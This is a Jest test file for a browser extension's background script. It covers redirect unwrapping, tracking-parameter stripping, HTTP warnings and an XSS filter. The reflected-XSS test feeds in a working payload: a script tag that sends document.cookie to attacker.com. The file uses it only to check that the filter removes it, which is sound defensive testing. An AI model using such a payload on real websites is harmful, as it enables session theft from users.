const background = require("../js/background.js");

// Importatnt to check that functions pass and fail, to ensure they are truely working  
// Example Test Unit
// test('TestName', () => {
//   expect(
//     background.FunctionName("")
//   ).toBe(
//     ""
//   );
// });

test('Redirect URL', () => {
  expect(background.redirectURLCheck("https://l.facebook.com/l.php?u=https%3A%2F%2Flinux.com%2Fubuntu%2F&h=AT2ttLsF617LJ7pdXaHPcic8fNAE_PUBSfQNrZsf1HmXdiIblyLrl6POXgMgoS6B7jy5yNb920G9QBWOzoBmC3sotOKMTgVM0rupBTyx2zVwKPMphfA_l4P0VPNq"))
  .toBe("https%3A%2F%2Flinux.com%2Fubuntu%2F");
});

test('No Change to Non-Redirect URL', () => {
  expect(background.redirectURLCheck("http://www.hwmwebshop.com/hemp-towels/supergreen.html?utm_medium=BannerAd&utm_campaign=BannerAdSupergreensource=SupergreenBannerAd"))
  .toBe("http://www.hwmwebshop.com/hemp-towels/supergreen.html?utm_medium=BannerAd&utm_campaign=BannerAdSupergreensource=SupergreenBannerAd");
});



test('HTTP Allow Check', () => {
  expect(background.httpAllowCheck("http://webscantest.com/"))
  .toBe("chrome-extension://jhppkdopegkaahmidhppplfpcnchhlfn/html/websiteWarning.html?http://webscantest.com/"
  );
});

test('Tracking Parameters in URL', () => {
  expect(background.trackingURLParameters("http://www.hwmwebshop.com/hemp-towels/supergreen.html?utm_medium=BannerAd&utm_campaign=BannerAdSupergreensource=SupergreenBannerAd"))
  .toBe("http://www.hwmwebshop.com/hemp-towels/supergreen.html?"
  );
});
test('No Tracking Parameters in URL', () => {
  expect(background.trackingURLParameters("http://www.hwmwebshop.com/hemp-towels/supergreen.html"))
  .toBe("http://www.hwmwebshop.com/hemp-towels/supergreen.html"
  );
});

test('Reflective XXS ', () => {
  expect(background.reflectiveXXS("http://www.example.com/search.php?q=<script>document.location='https://attacker.com/?cookie='+encodeURIComponent(document.cookie)</script>"))
  .toBe("http://www.example.com/search.php?q=");
});

test('Cookie URL Check', () => {
  expect(background.cookieURLCheck("ads.google.com"))
  .toBe("ads.google.com");
});

test('Check URL', () => {
  expect(background.checkURL("http://webscantest.com/"))
  .toBe("https://webscantest.com/");
});